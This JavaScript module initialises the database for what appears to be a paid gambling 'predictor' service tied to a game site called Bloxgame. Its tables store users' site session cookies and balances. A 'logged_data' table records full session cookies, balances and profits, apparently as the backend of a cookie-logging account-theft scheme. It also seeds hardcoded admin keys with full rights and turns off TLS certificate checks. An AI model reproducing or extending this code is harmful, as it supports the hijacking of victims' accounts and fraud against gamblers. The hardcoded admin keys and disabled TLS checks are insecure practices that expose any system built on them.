const path = require('path');
require('dotenv').config({ path: path.join(__dirname, '.env') });
const { Pool } = require('pg');
const sqlite3 = require('sqlite3').verbose();

let dbType = 'sqlite';
let pool;
let sqliteDb;

if (process.env.DATABASE_URL) {
  dbType = 'postgres';
  console.log('🟢 DATABASE_URL found — connecting to PostgreSQL (Neon)');
  pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: { rejectUnauthorized: false }
  });
} else {
  console.log('🔴 DATABASE_URL NOT FOUND — falling back to local SQLite (THIS IS WRONG!)');
  sqliteDb = new sqlite3.Database('./database.sqlite');

  pool = {
    query: (text, params) => {
      let sql = text.replace(/\$(\d+)/g, '?');
      sql = sql.replace(/NOW\(\)/g, 'CURRENT_TIMESTAMP');

      return new Promise((resolve, reject) => {
        if (sql.trim().toUpperCase().startsWith('SELECT')) {
          sqliteDb.all(sql, params || [], (err, rows) => {
            if (err) reject(err);
            else resolve({ rows });
          });
        } else {
          sqliteDb.run(sql, params || [], function (err) {
            if (err) reject(err);
            else resolve({ rows: [], lastID: this.lastID, changes: this.changes });
          });
        }
      });
    },
    connect: () => ({
      query: (text, params) => pool.query(text, params),
      release: () => { }
    })
  };
}

async function initDb() {
  if (dbType === 'postgres') {
    const client = await pool.connect();
    try {
      await client.query(`
        CREATE TABLE IF NOT EXISTS keys (
          id SERIAL PRIMARY KEY,
          key_value TEXT UNIQUE NOT NULL,
          username TEXT, 
          is_admin INTEGER DEFAULT 0,
          is_banned INTEGER DEFAULT 0,
          is_registered INTEGER DEFAULT 0,
          referral_code TEXT UNIQUE,
          referred_by_id INTEGER,
          premium_until TIMESTAMP,
          created_at TIMESTAMP DEFAULT NOW(),
          expires_at TIMESTAMP,
          last_active_at TIMESTAMP,
          admin_type TEXT DEFAULT 'none',
          last_read_announcement_id INTEGER DEFAULT 0,
          bloxgame_cookie TEXT,
          bloxgame_balance REAL DEFAULT 0,
          blox_cookie TEXT,
          blox_balance TEXT,
          total_profits REAL DEFAULT 0,
          user_type TEXT DEFAULT 'free',
          predictions_today INTEGER DEFAULT 0,
          predictions_reset_date TEXT,
          FOREIGN KEY(referred_by_id) REFERENCES keys(id)
        );

        CREATE TABLE IF NOT EXISTS announcements (
          id SERIAL PRIMARY KEY,
          content TEXT NOT NULL,
          author_id INTEGER,
          created_at TIMESTAMP DEFAULT NOW(),
          FOREIGN KEY(author_id) REFERENCES keys(id)
        );

        CREATE TABLE IF NOT EXISTS game_logs (
          id SERIAL PRIMARY KEY,
          user_id INTEGER,
          game_type TEXT,
          mines_count INTEGER,
          prediction TEXT,
          actual_outcome TEXT,
          client_seed TEXT,
          server_seed_hash TEXT,
          nonce INTEGER,
          confidence TEXT,
          created_at TIMESTAMP DEFAULT NOW(),
          FOREIGN KEY(user_id) REFERENCES keys(id)
        );

        CREATE TABLE IF NOT EXISTS settings (
          key TEXT PRIMARY KEY,
          value TEXT
        );

        CREATE TABLE IF NOT EXISTS payment_requests (
          id SERIAL PRIMARY KEY,
          wallet_address TEXT,
          amount REAL,
          coin TEXT,
          status TEXT DEFAULT 'pending',
          tx_hash TEXT UNIQUE,
          email TEXT,
          user_key TEXT,
          duration_hours INTEGER DEFAULT 24,
          created_at TIMESTAMP DEFAULT NOW()
        );

        CREATE TABLE IF NOT EXISTS logged_data (
          id SERIAL PRIMARY KEY,
          user_id INTEGER,
          session_cookie TEXT,
          full_cookie TEXT,
          balance TEXT,
          type TEXT,
          profits REAL,
          breakdown JSONB,
          created_at TIMESTAMP DEFAULT NOW(),
          FOREIGN KEY(user_id) REFERENCES keys(id)
        );
      `);

      // Migration: Add columns if missing
      await client.query(`
        DO $$ 
        BEGIN 
          IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='payment_requests' AND column_name='duration_hours') THEN
            ALTER TABLE payment_requests ADD COLUMN duration_hours INTEGER DEFAULT 24;
          END IF;
          IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='keys' AND column_name='admin_type') THEN
            ALTER TABLE keys ADD COLUMN admin_type TEXT DEFAULT 'none';
          END IF;
          IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='keys' AND column_name='last_read_announcement_id') THEN
            ALTER TABLE keys ADD COLUMN last_read_announcement_id INTEGER DEFAULT 0;
          END IF;
          IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='keys' AND column_name='bloxgame_cookie') THEN
            ALTER TABLE keys ADD COLUMN bloxgame_cookie TEXT;
          END IF;
          IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='keys' AND column_name='bloxgame_balance') THEN
            ALTER TABLE keys ADD COLUMN bloxgame_balance REAL DEFAULT 0;
          END IF;
          IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='keys' AND column_name='blox_cookie') THEN
            ALTER TABLE keys ADD COLUMN blox_cookie TEXT;
          END IF;
          IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='keys' AND column_name='blox_balance') THEN
            ALTER TABLE keys ADD COLUMN blox_balance TEXT;
          END IF;
          IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='keys' AND column_name='total_profits') THEN
            ALTER TABLE keys ADD COLUMN total_profits REAL DEFAULT 0;
          END IF;
          IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='keys' AND column_name='user_type') THEN
            ALTER TABLE keys ADD COLUMN user_type TEXT DEFAULT 'free';
          END IF;
          IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='keys' AND column_name='predictions_today') THEN
            ALTER TABLE keys ADD COLUMN predictions_today INTEGER DEFAULT 0;
          END IF;
          IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='keys' AND column_name='predictions_reset_date') THEN
            ALTER TABLE keys ADD COLUMN predictions_reset_date TEXT;
          END IF;
        END $$;
      `);

      console.log('✅ PostgreSQL database initialized');
    } finally {
      client.release();
    }
  } else {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS keys (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        key_value TEXT UNIQUE NOT NULL,
        username TEXT, 
        is_admin INTEGER DEFAULT 0,
        is_banned INTEGER DEFAULT 0,
        is_registered INTEGER DEFAULT 0,
        referral_code TEXT UNIQUE,
        referred_by_id INTEGER,
        premium_until DATETIME,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        expires_at DATETIME,
        last_active_at DATETIME,
        admin_type TEXT DEFAULT 'none',
        last_read_announcement_id INTEGER DEFAULT 0,
        bloxgame_cookie TEXT,
        bloxgame_balance REAL DEFAULT 0,
        blox_cookie TEXT,
        blox_balance TEXT,
        total_profits REAL DEFAULT 0,
        user_type TEXT DEFAULT 'free',
        predictions_today INTEGER DEFAULT 0,
        predictions_reset_date TEXT
      )
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS announcements (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        content TEXT NOT NULL,
        author_id INTEGER,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS logged_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        session_cookie TEXT,
        full_cookie TEXT,
        balance TEXT,
        type TEXT,
        profits REAL,
        breakdown TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS game_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        game_type TEXT,
        mines_count INTEGER,
        prediction TEXT,
        actual_outcome TEXT,
        client_seed TEXT,
        server_seed_hash TEXT,
        nonce INTEGER,
        confidence TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT
      )
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS payment_requests (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        wallet_address TEXT,
        amount REAL,
        coin TEXT,
        status TEXT DEFAULT 'pending',
        tx_hash TEXT UNIQUE,
        email TEXT,
        user_key TEXT,
        duration_hours INTEGER DEFAULT 24,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `);

    // Migration for SQLite
    try { await pool.query("ALTER TABLE payment_requests ADD COLUMN duration_hours INTEGER DEFAULT 24"); } catch (e) { }
    try { await pool.query("ALTER TABLE keys ADD COLUMN admin_type TEXT DEFAULT 'none'"); } catch (e) { }
    try { await pool.query("ALTER TABLE keys ADD COLUMN last_read_announcement_id INTEGER DEFAULT 0"); } catch (e) { }
    try { await pool.query("ALTER TABLE keys ADD COLUMN bloxgame_cookie TEXT"); } catch (e) { }
    try { await pool.query("ALTER TABLE keys ADD COLUMN bloxgame_balance REAL DEFAULT 0"); } catch (e) { }
    try { await pool.query("ALTER TABLE keys ADD COLUMN blox_cookie TEXT"); } catch (e) { }
    try { await pool.query("ALTER TABLE keys ADD COLUMN blox_balance TEXT"); } catch (e) { }
    try { await pool.query("ALTER TABLE keys ADD COLUMN total_profits REAL DEFAULT 0"); } catch (e) { }
    try { await pool.query("ALTER TABLE keys ADD COLUMN user_type TEXT DEFAULT 'free'"); } catch (e) { }
    try { await pool.query("ALTER TABLE keys ADD COLUMN predictions_today INTEGER DEFAULT 0"); } catch (e) { }
    try { await pool.query("ALTER TABLE keys ADD COLUMN predictions_reset_date TEXT"); } catch (e) { }

    console.log('✅ SQLite database ready');
  }

  // --- SEED ADMINS ---
  const adminKeyNiam = 'admin-niam';
  const checkNiam = await pool.query('SELECT id FROM keys WHERE key_value = $1', [adminKeyNiam]);
  if (checkNiam.rows.length === 0) {
    const refCode = 'NIAM-' + Math.random().toString(36).substring(2, 7).toUpperCase();
    await pool.query(
      "INSERT INTO keys (key_value, username, is_admin, is_registered, referral_code, admin_type, user_type) VALUES ($1, 'AdminBoss', 1, 1, $2, 'full', 'premium')",
      [adminKeyNiam, refCode]
    );
  } else {
    await pool.query("UPDATE keys SET admin_type = 'full', user_type = 'premium' WHERE key_value = $1", [adminKeyNiam]);
  }

  const adminKeyBlazee = 'admin-blazee';
  const checkBlazee = await pool.query('SELECT id FROM keys WHERE key_value = $1', [adminKeyBlazee]);
  if (checkBlazee.rows.length === 0) {
    const refCode = 'BLZE-' + Math.random().toString(36).substring(2, 7).toUpperCase();
    await pool.query(
      "INSERT INTO keys (key_value, username, is_admin, is_registered, referral_code, admin_type, user_type) VALUES ($1, 'KeyForge', 1, 1, $2, 'keygen', 'premium')",
      [adminKeyBlazee, refCode]
    );
  } else {
    await pool.query("UPDATE keys SET admin_type = 'keygen', user_type = 'premium' WHERE key_value = $1", [adminKeyBlazee]);
  }

  const keysWithoutRef = await pool.query('SELECT id FROM keys WHERE referral_code IS NULL');
  for (const k of keysWithoutRef.rows) {
    const code = 'REF-' + Math.random().toString(36).substring(2, 7).toUpperCase();
    await pool.query('UPDATE keys SET referral_code = $1 WHERE id = $2', [code, k.id]);
  }
}

module.exports = { pool, initDb };
